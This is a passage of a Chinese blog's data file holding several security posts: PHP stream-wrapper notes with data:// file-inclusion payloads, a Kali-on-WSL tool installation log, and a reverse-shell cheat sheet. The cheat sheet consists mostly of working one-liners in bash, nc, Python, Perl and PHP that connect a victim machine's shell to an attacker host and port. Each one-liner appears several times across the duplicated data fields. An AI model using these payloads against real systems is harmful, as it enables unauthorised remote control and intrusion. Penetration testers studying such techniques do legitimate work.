封装器删除压缩文件。</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.rename.php\" target=\"_blank\" rel=\"noopener\">rename()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.mkdir.php\" target=\"_blank\" rel=\"noopener\">mkdir()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.rmdir.php\" target=\"_blank\" rel=\"noopener\">rmdir()</a></td>\n<td align=\"left\">No</td>\n</tr>\n</tbody></table>\n<h4 id=\"1-zip-协议\"><a href=\"#1-zip-协议\" class=\"headerlink\" title=\"1. zip://协议\"></a>1. zip://协议</h4><p>zip:// [压缩文件路径]#[压缩文件内的子文件]</p>\n<p>测试失败 ,报错</p>\n<p><strong>【bzip2://协议】</strong></p>\n<p><strong>使用方法：</strong></p>\n<p>compress.bzip2://[压缩文件地址]</p>\n<p>测试失败 没有返回数据</p>\n<h4 id=\"3-zlib-协议\"><a href=\"#3-zlib-协议\" class=\"headerlink\" title=\"3. zlib://协议\"></a>3. zlib://协议</h4><p>compress.zlib://[压缩文件地址]</p>\n<p><img src=\"/pic/20.png\" alt=\"\"></p>\n<h3 id=\"0x04-data\"><a href=\"#0x04-data\" class=\"headerlink\" title=\"0x04 data://\"></a>0x04 data://</h3><p>经过测试官方文档上存在问题，经过测试data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">属性</th>\n<th align=\"left\">支持</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">受限于 <a href=\"https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-fopen\" target=\"_blank\" rel=\"noopener\">allow_url_fopen</a></td>\n<td align=\"left\">Yes</td>\n</tr>\n<tr>\n<td align=\"left\">受限于 <a href=\"https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include\" target=\"_blank\" rel=\"noopener\">allow_url_include</a></td>\n<td align=\"left\">Yes</td>\n</tr>\n<tr>\n<td align=\"left\">允许读取</td>\n<td align=\"left\">Yes</td>\n</tr>\n<tr>\n<td align=\"left\">允许写入</td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">允许追加</td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">允许同时读写</td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.stat.php\" target=\"_blank\" rel=\"noopener\">stat()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.unlink.php\" target=\"_blank\" rel=\"noopener\">unlink()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.rename.php\" target=\"_blank\" rel=\"noopener\">rename()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.mkdir.php\" target=\"_blank\" rel=\"noopener\">mkdir()</a></td>\n<td align=\"left\">No</td>\n</tr>\n<tr>\n<td align=\"left\">支持 <a href=\"https://www.php.net/manual/zh/function.rmdir.php\" target=\"_blank\" rel=\"noopener\">rmdir()</a></td>\n<td align=\"left\">No</td>\n</tr>\n</tbody></table>\n<p><a href=\"http://localhost/temp.php?file=data://text/plain\" target=\"_blank\" rel=\"noopener\">http://localhost/temp.php?file=data://text/plain</a>,<?php phpinfo()?></p>\n<p><a href=\"http://localhost/temp.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\" target=\"_blank\" rel=\"noopener\">http://localhost/temp.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>\n<p><a href=\"http://localhost/temp.php?file=data:text/plain\" target=\"_blank\" rel=\"noopener\">http://localhost/temp.php?file=data:text/plain</a>,<?php phpinfo()?></p>\n<p><a href=\"http://localhost/temp.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\" target=\"_blank\" rel=\"noopener\">http://localhost/temp.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a></p>\n<p><img src=\"/pic/21.png\" alt=\"\"></p>\n<h3 id=\"0x05-总结\"><a href=\"#0x05-总结\" class=\"headerlink\" title=\"0x05 总结\"></a>0x05 总结</h3><p><img src=\"/pic/22.png\" alt=\"\"></p>"},{"title":"win子系统安装kali工具记录","date":"2020-03-04T20:08:48.000Z","_content":"\nwin下的子系统kali默认是不带有Metasploit\n\n如果是其他linux安装需要换源\n\n<!--more-->\n\n```\nvim /etc/apt/sources.list\n```\n\n会自动选取最近的源服务器\n\n```\ndeb http://http.kali.org/kali kali-rolling main non-free contrib\ndeb-src http://http.kali.org/kali kali-rolling main non-free contrib\n```\n\n换好之后就是更新一下\n\n```\napt update\n```\n\n下载需要的工具例如Matesploit\n\n```\nsudo apt-get install metasploit-framework\n```\n\n安装好之后需要初始化postgres数据库\n\n```\nsudo msfdb init\n```\n\n安装ncat，sqlmap，nmap,aircrack-ng等\n\n```\nsudo apt-get -y insatll ncat\nsudo apt-get -y insatll sqlmap\nsudo apt-get -y insatll nmap\nsudo apt-get -y insatll aircrack-ng\n```\n\n\n\n在安装完wireshark后运行报错\n\n```\nsx@QAQ:~$ wireshark\nwireshark: error while loading shared libraries: libQt5Core.so.5: cannot open shared object file: No such file or directory\n```\n\n删除标签即可参考链接https://github.com/Microsoft/WSL/issues/3023\n\n```\n sudo strip --remove-section=.note.ABI-tag /usr/lib/x86_64-linux-gnu/libQt5Core.so.5.12.5\n```\n\n\n\n记录一下更改用户名以及家目录\n\n```\nusermod -l NewUser -d /home/NewUser -m OldUser\n```\n\n\n\n直接ping host\n\n```\nping: socket: Operation not permitted\n```\n\nsudo ping 后正常\n\n```\n$ sudo ping 1.1.1.1\nPING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.\n64 bytes from 1.1.1.1: icmp_seq=1 ttl=64 time=188 ms\n64 bytes from 1.1.1.1: icmp_seq=2 ttl=64 time=188 ms\n64 bytes from 1.1.1.1: icmp_seq=3 ttl=64 time=191 ms\n64 bytes from 1.1.1.1: icmp_seq=4 ttl=64 time=187 ms\n```\n\n解决办法   chmod +s 就是给某个程序暂时root权限，运行后恢复正常权限\n\n```\n$ type ping\nping is hashed (/usr/bin/ping)\n$ sudo chmod +s /usr/bin/ping\n```\n\n","source":"_posts/win子系统安装kali工具记录.md","raw":"---\ntitle: win子系统安装kali工具记录\ndate: 2020-03-05 04:08:48\ntags:\n - 工具安装\n---\n\nwin下的子系统kali默认是不带有Metasploit\n\n如果是其他linux安装需要换源\n\n<!--more-->\n\n```\nvim /etc/apt/sources.list\n```\n\n会自动选取最近的源服务器\n\n```\ndeb http://http.kali.org/kali kali-rolling main non-free contrib\ndeb-src http://http.kali.org/kali kali-rolling main non-free contrib\n```\n\n换好之后就是更新一下\n\n```\napt update\n```\n\n下载需要的工具例如Matesploit\n\n```\nsudo apt-get install metasploit-framework\n```\n\n安装好之后需要初始化postgres数据库\n\n```\nsudo msfdb init\n```\n\n安装ncat，sqlmap，nmap,aircrack-ng等\n\n```\nsudo apt-get -y insatll ncat\nsudo apt-get -y insatll sqlmap\nsudo apt-get -y insatll nmap\nsudo apt-get -y insatll aircrack-ng\n```\n\n\n\n在安装完wireshark后运行报错\n\n```\nsx@QAQ:~$ wireshark\nwireshark: error while loading shared libraries: libQt5Core.so.5: cannot open shared object file: No such file or directory\n```\n\n删除标签即可参考链接https://github.com/Microsoft/WSL/issues/3023\n\n```\n sudo strip --remove-section=.note.ABI-tag /usr/lib/x86_64-linux-gnu/libQt5Core.so.5.12.5\n```\n\n\n\n记录一下更改用户名以及家目录\n\n```\nusermod -l NewUser -d /home/NewUser -m OldUser\n```\n\n\n\n直接ping host\n\n```\nping: socket: Operation not permitted\n```\n\nsudo ping 后正常\n\n```\n$ sudo ping 1.1.1.1\nPING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.\n64 bytes from 1.1.1.1: icmp_seq=1 ttl=64 time=188 ms\n64 bytes from 1.1.1.1: icmp_seq=2 ttl=64 time=188 ms\n64 bytes from 1.1.1.1: icmp_seq=3 ttl=64 time=191 ms\n64 bytes from 1.1.1.1: icmp_seq=4 ttl=64 time=187 ms\n```\n\n解决办法   chmod +s 就是给某个程序暂时root权限，运行后恢复正常权限\n\n```\n$ type ping\nping is hashed (/usr/bin/ping)\n$ sudo chmod +s /usr/bin/ping\n```\n\n","slug":"win子系统安装kali工具记录","published":1,"updated":"2020-03-04T20:08:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfn6001mpk7e5qzib22j","content":"<p>win下的子系统kali默认是不带有Metasploit</p>\n<p>如果是其他linux安装需要换源</p>\n<a id=\"more\"></a>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br></pre></td></tr></table></figure>\n\n<p>会自动选取最近的源服务器</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class=\"line\">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>\n\n<p>换好之后就是更新一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt update</span><br></pre></td></tr></table></figure>\n\n<p>下载需要的工具例如Matesploit</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install metasploit-framework</span><br></pre></td></tr></table></figure>\n\n<p>安装好之后需要初始化postgres数据库</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo msfdb init</span><br></pre></td></tr></table></figure>\n\n<p>安装ncat，sqlmap，nmap,aircrack-ng等</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get -y insatll ncat</span><br><span class=\"line\">sudo apt-get -y insatll sqlmap</span><br><span class=\"line\">sudo apt-get -y insatll nmap</span><br><span class=\"line\">sudo apt-get -y insatll aircrack-ng</span><br></pre></td></tr></table></figure>\n\n\n\n<p>在安装完wireshark后运行报错</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sx@QAQ:~$ wireshark</span><br><span class=\"line\">wireshark: error while loading shared libraries: libQt5Core.so.5: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>\n\n<p>删除标签即可参考链接<a href=\"https://github.com/Microsoft/WSL/issues/3023\" target=\"_blank\" rel=\"noopener\">https://github.com/Microsoft/WSL/issues/3023</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo strip --remove-section&#x3D;.note.ABI-tag &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libQt5Core.so.5.12.5</span><br></pre></td></tr></table></figure>\n\n\n\n<p>记录一下更改用户名以及家目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">usermod -l NewUser -d &#x2F;home&#x2F;NewUser -m OldUser</span><br></pre></td></tr></table></figure>\n\n\n\n<p>直接ping host</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ping: socket: Operation not permitted</span><br></pre></td></tr></table></figure>\n\n<p>sudo ping 后正常</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo ping 1.1.1.1</span><br><span class=\"line\">PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.</span><br><span class=\"line\">64 bytes from 1.1.1.1: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;188 ms</span><br><span class=\"line\">64 bytes from 1.1.1.1: icmp_seq&#x3D;2 ttl&#x3D;64 time&#x3D;188 ms</span><br><span class=\"line\">64 bytes from 1.1.1.1: icmp_seq&#x3D;3 ttl&#x3D;64 time&#x3D;191 ms</span><br><span class=\"line\">64 bytes from 1.1.1.1: icmp_seq&#x3D;4 ttl&#x3D;64 time&#x3D;187 ms</span><br></pre></td></tr></table></figure>\n\n<p>解决办法   chmod +s 就是给某个程序暂时root权限，运行后恢复正常权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ type ping</span><br><span class=\"line\">ping is hashed (&#x2F;usr&#x2F;bin&#x2F;ping)</span><br><span class=\"line\">$ sudo chmod +s &#x2F;usr&#x2F;bin&#x2F;ping</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>win下的子系统kali默认是不带有Metasploit</p>\n<p>如果是其他linux安装需要换源</p>","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br></pre></td></tr></table></figure>\n\n<p>会自动选取最近的源服务器</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br><span class=\"line\">deb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>\n\n<p>换好之后就是更新一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt update</span><br></pre></td></tr></table></figure>\n\n<p>下载需要的工具例如Matesploit</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install metasploit-framework</span><br></pre></td></tr></table></figure>\n\n<p>安装好之后需要初始化postgres数据库</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo msfdb init</span><br></pre></td></tr></table></figure>\n\n<p>安装ncat，sqlmap，nmap,aircrack-ng等</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get -y insatll ncat</span><br><span class=\"line\">sudo apt-get -y insatll sqlmap</span><br><span class=\"line\">sudo apt-get -y insatll nmap</span><br><span class=\"line\">sudo apt-get -y insatll aircrack-ng</span><br></pre></td></tr></table></figure>\n\n\n\n<p>在安装完wireshark后运行报错</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sx@QAQ:~$ wireshark</span><br><span class=\"line\">wireshark: error while loading shared libraries: libQt5Core.so.5: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>\n\n<p>删除标签即可参考链接<a href=\"https://github.com/Microsoft/WSL/issues/3023\" target=\"_blank\" rel=\"noopener\">https://github.com/Microsoft/WSL/issues/3023</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo strip --remove-section&#x3D;.note.ABI-tag &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libQt5Core.so.5.12.5</span><br></pre></td></tr></table></figure>\n\n\n\n<p>记录一下更改用户名以及家目录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">usermod -l NewUser -d &#x2F;home&#x2F;NewUser -m OldUser</span><br></pre></td></tr></table></figure>\n\n\n\n<p>直接ping host</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ping: socket: Operation not permitted</span><br></pre></td></tr></table></figure>\n\n<p>sudo ping 后正常</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo ping 1.1.1.1</span><br><span class=\"line\">PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.</span><br><span class=\"line\">64 bytes from 1.1.1.1: icmp_seq&#x3D;1 ttl&#x3D;64 time&#x3D;188 ms</span><br><span class=\"line\">64 bytes from 1.1.1.1: icmp_seq&#x3D;2 ttl&#x3D;64 time&#x3D;188 ms</span><br><span class=\"line\">64 bytes from 1.1.1.1: icmp_seq&#x3D;3 ttl&#x3D;64 time&#x3D;191 ms</span><br><span class=\"line\">64 bytes from 1.1.1.1: icmp_seq&#x3D;4 ttl&#x3D;64 time&#x3D;187 ms</span><br></pre></td></tr></table></figure>\n\n<p>解决办法   chmod +s 就是给某个程序暂时root权限，运行后恢复正常权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ type ping</span><br><span class=\"line\">ping is hashed (&#x2F;usr&#x2F;bin&#x2F;ping)</span><br><span class=\"line\">$ sudo chmod +s &#x2F;usr&#x2F;bin&#x2F;ping</span><br></pre></td></tr></table></figure>"},{"title":"关于反弹shell的姿势","date":"2020-03-05T07:26:53.000Z","_content":"\n## linux下的反弹\n\n本机使用nc\n\n```\nnc -lvp port\n```\n\n<!--more-->\n\n### bash\n\n```\nbash -i >& /dev/tcp/host/port 0>&1\n```\n\n> - linux shell下常用的文件描述符是：\n>\n>   > 1. 标准输入  (stdin) ：代码为 0 ，使用 < 或 << ； \n>   >\n>   > 2. 标准输出  (stdout)：代码为 1 ，使用 > 或 >> ； \n>   >\n>   > 3. 标准错误输出(stderr)：代码为 2 ，使用 2> 或 2>>。\n>\n> - bash -i 新开一个交互bash\n>\n> - \\>&或者 &\\>  将标准错误输出定向到标准输出中\n>\n> - 0>&1或者0<&1将标准输入重定向到标准输出中\n>\n> - /dev/tcp/host/port  使用tcp通道与host:post建立一个连接\n>\n> - 如果还是不清楚 参考手册https://www.gnu.org/software/bash/manual/bash.pdf 3.6 章redirections\n\n\n\n### nc\n\n```\nnc -e /bin/bash host port\n```\n\n>nc -e   inbound program to exec [dangerous!!]\n\n\n\n有些版本的NC没有-e选项，在本机开两个端口\n\n```\nnc -lvp port1\nnc -lvp port2\n```\n\n\n\n受控机\n\n```\nnc host port1 | /bin/bash | nc host port2\n```\n\n>- 管道命令，从host:pot1输入数据交给 /bin/bash处理，再交给host：port2输出\n>\n>- 将nc 改成telnet 也是可以的\n\n\n\n\n\n### python\n\n```\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"host\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\n\n\n### perl\n\n```\nperl -e 'use Socket;$i=\"host\";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'\n```\n\n\n\n### php\n\n```\nphp -r '$sock=fsockopen(\"host\",port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'\n```\n\n> php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数\n\n\n\n\n\n参考连接\n\nhttps://www.freebuf.com/news/142195.html\n\nhttps://www.freebuf.com/articles/system/147768.html\n\nhttps://www.freebuf.com/articles/system/178150.html\n\nhttps://www.freebuf.com/articles/system/153986.html","source":"_posts/关于反弹shell的姿势.md","raw":"---\ntitle: 关于反弹shell的姿势\ndate: 2020-03-05 15:26:53\ntags:\n - shell\n - 渗透测试\ncategories:\n - 日常积累\n---\n\n## linux下的反弹\n\n本机使用nc\n\n```\nnc -lvp port\n```\n\n<!--more-->\n\n### bash\n\n```\nbash -i >& /dev/tcp/host/port 0>&1\n```\n\n> - linux shell下常用的文件描述符是：\n>\n>   > 1. 标准输入  (stdin) ：代码为 0 ，使用 < 或 << ； \n>   >\n>   > 2. 标准输出  (stdout)：代码为 1 ，使用 > 或 >> ； \n>   >\n>   > 3. 标准错误输出(stderr)：代码为 2 ，使用 2> 或 2>>。\n>\n> - bash -i 新开一个交互bash\n>\n> - \\>&或者 &\\>  将标准错误输出定向到标准输出中\n>\n> - 0>&1或者0<&1将标准输入重定向到标准输出中\n>\n> - /dev/tcp/host/port  使用tcp通道与host:post建立一个连接\n>\n> - 如果还是不清楚 参考手册https://www.gnu.org/software/bash/manual/bash.pdf 3.6 章redirections\n\n\n\n### nc\n\n```\nnc -e /bin/bash host port\n```\n\n>nc -e   inbound program to exec [dangerous!!]\n\n\n\n有些版本的NC没有-e选项，在本机开两个端口\n\n```\nnc -lvp port1\nnc -lvp port2\n```\n\n\n\n受控机\n\n```\nnc host port1 | /bin/bash | nc host port2\n```\n\n>- 管道命令，从host:pot1输入数据交给 /bin/bash处理，再交给host：port2输出\n>\n>- 将nc 改成telnet 也是可以的\n\n\n\n\n\n### python\n\n```\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"host\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\n\n\n### perl\n\n```\nperl -e 'use Socket;$i=\"host\";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'\n```\n\n\n\n### php\n\n```\nphp -r '$sock=fsockopen(\"host\",port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'\n```\n\n> php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数\n\n\n\n\n\n参考连接\n\nhttps://www.freebuf.com/news/142195.html\n\nhttps://www.freebuf.com/articles/system/147768.html\n\nhttps://www.freebuf.com/articles/system/178150.html\n\nhttps://www.freebuf.com/articles/system/153986.html","slug":"关于反弹shell的姿势","published":1,"updated":"2020-03-05T07:26:53.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfnc001qpk7e89qg8fy0","content":"<h2 id=\"linux下的反弹\"><a href=\"#linux下的反弹\" class=\"headerlink\" title=\"linux下的反弹\"></a>linux下的反弹</h2><p>本机使用nc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvp port</span><br></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<h3 id=\"bash\"><a href=\"#bash\" class=\"headerlink\" title=\"bash\"></a>bash</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;host&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li><p>linux shell下常用的文件描述符是：</p>\n<blockquote>\n<ol>\n<li><p>标准输入  (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p>\n</li>\n<li><p>标准输出  (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p>\n</li>\n<li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p>\n</li>\n</ol>\n</blockquote>\n</li>\n<li><p>bash -i 新开一个交互bash</p>\n</li>\n<li><p>&gt;&amp;或者 &amp;&gt;  将标准错误输出定向到标准输出中</p>\n</li>\n<li><p>0&gt;&amp;1或者0&lt;&amp;1将标准输入重定向到标准输出中</p>\n</li>\n<li><p>/dev/tcp/host/port  使用tcp通道与host:post建立一个连接</p>\n</li>\n<li><p>如果还是不清楚 参考手册<a href=\"https://www.gnu.org/software/bash/manual/bash.pdf\" target=\"_blank\" rel=\"noopener\">https://www.gnu.org/software/bash/manual/bash.pdf</a> 3.6 章redirections</p>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"nc\"><a href=\"#nc\" class=\"headerlink\" title=\"nc\"></a>nc</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -e &#x2F;bin&#x2F;bash host port</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>nc -e   inbound program to exec [dangerous!!]</p>\n</blockquote>\n<p>有些版本的NC没有-e选项，在本机开两个端口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvp port1</span><br><span class=\"line\">nc -lvp port2</span><br></pre></td></tr></table></figure>\n\n\n\n<p>受控机</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc host port1 | &#x2F;bin&#x2F;bash | nc host port2</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li><p>管道命令，从host:pot1输入数据交给 /bin/bash处理，再交给host：port2输出</p>\n</li>\n<li><p>将nc 改成telnet 也是可以的</p>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;host&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"perl\"><a href=\"#perl\" class=\"headerlink\" title=\"perl\"></a>perl</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">perl -e &#39;use Socket;$i&#x3D;&quot;host&quot;;$p&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"php\"><a href=\"#php\" class=\"headerlink\" title=\"php\"></a>php</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r &#39;$sock&#x3D;fsockopen(&quot;host&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数</p>\n</blockquote>\n<p>参考连接</p>\n<p><a href=\"https://www.freebuf.com/news/142195.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/news/142195.html</a></p>\n<p><a href=\"https://www.freebuf.com/articles/system/147768.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/system/147768.html</a></p>\n<p><a href=\"https://www.freebuf.com/articles/system/178150.html\" target=\"_blank\" 